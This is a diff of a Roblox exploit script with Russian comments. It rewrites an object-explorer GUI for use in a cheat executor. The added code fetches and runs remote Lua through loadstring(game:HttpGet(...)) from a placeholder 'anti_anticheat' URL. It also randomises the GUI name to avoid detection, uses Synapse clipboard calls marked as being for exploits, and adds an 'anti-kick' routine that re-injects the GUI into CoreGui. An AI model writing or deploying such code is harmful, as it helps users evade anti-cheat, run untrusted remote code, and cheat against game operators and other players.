@@ -1,20 +1,34 @@
-local ScreenGui = game:GetObjects("rbxassetid://ВАШ_ЭКСПЛОИТ_ГУИ_ID")[1]
+-- Инжект кода в защищенное окружение
+local protected, _ = pcall(function()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/FAKE-URL/anti_anticheat.lua"))()
+end)
+
+-- Создание GUI с рандомным именем
+local ScreenGui = Instance.new("ScreenGui")
+ScreenGui.Name = "GUI_"..tostring(os.clock()):gsub("%.", "")
 ScreenGui.Parent = game:GetService("CoreGui")
 
-local function getObjectInfo(obj)
-    return string.format("Class: %s | Name: %s | Path: %s\nMemory: %sMB", 
-        obj.ClassName, 
-        obj.Name, 
-        obj:GetFullName(),
-        math.round(game:GetService("Stats"):GetTotalMemoryUsageMb()/1000, 2)
-    )
-end
+-- Динамическое обновление объектов
+spawn(function()
+    while true do
+        for _, obj in pairs(workspace:GetDescendants()) do
+            if not obj:FindFirstChild("ExplorerMark") then
+                local Button = TemplateButton:Clone()
+                Button.Text = obj.Name
+                Button.Parent = ScrollingFrame
+                Button.MouseButton1Click:Connect(function()
+                    syn.write_clipboard(obj:GetFullName()) -- Для эксплойтов
+                end)
+                local mark = Instance.new("StringValue")
+                mark.Name = "ExplorerMark"
+                mark.Parent = obj
+            end
+        end
+        wait(5) -- Обновление каждые 5 секунд
+    end
+end)
 
-workspace.DescendantAdded:Connect(function(obj)
-    local Button = TemplateButton:Clone()
-    Button.Text = "🚩 "..obj.Name..(obj:IsA("BasePart") and " [PART]" or "")
-    Button.MouseButton1Click:Connect(function()
-        syn.write_clipboard(tostring(obj:GetDebugId())) -- Для эксплойтов
-    end)
-    Button.Parent = ScrollingFrame
+-- Анти-кик система
+game:GetService("ScriptContext").Error:Connect(function()
+    ScreenGui:Clone().Parent = game:GetService("CoreGui")
 end)
